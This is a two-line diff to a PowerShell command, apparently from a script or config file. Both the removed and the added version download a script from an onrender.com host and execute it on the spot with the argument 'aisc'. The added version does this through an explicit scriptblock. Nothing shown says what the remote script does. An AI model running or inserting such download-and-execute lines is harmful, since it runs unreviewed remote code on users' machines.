@@ -1,1 +1,2 @@
-& (irm https://cli-t0km.onrender.com/list.ps1) aisc
+$s = Invoke-RestMethod "https://cli-t0km.onrender.com/list.ps1"
+& ([scriptblock]::Create($s)) aisc
